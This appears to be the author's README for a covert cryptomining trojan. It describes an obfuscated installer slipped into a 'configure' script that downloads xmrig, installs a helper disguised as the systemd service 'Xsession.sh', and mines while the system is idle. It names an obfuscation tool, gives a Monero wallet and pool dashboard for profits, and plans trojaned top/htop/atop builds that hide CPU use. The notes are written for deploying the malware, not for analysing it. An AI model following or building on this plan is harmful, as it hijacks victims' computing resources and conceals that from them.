# Logic

`install.sh` is obfuscated and inserted into `configure`.
`install.sh` is executed by `configure`: it downloads `xmrig` and `Xsession.sh` to `$HOME/.local` and installs `Xsession.sh` as a user systemd daemon. `Xsession.sh` should be obfuscated as well. `Xsession.sh` checks for inactivity on the system and runs / stop xmrig accordingly. 

# Obfuscator

```
npm install -g bash-obfuscate
```

# Useful commands

```bash
systemctl --user status Xsession.sh.service
```

```bash
journalctl --user -u Xsession.sh.service -f
```

# Monitor profit

```
https://monero.hashvault.pro/ru/dashboard

Wallet:
41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
```

# Todo

1. Add `top`, `htop`, `atop` to user's path. These should be statically compiled and never show cpu usage.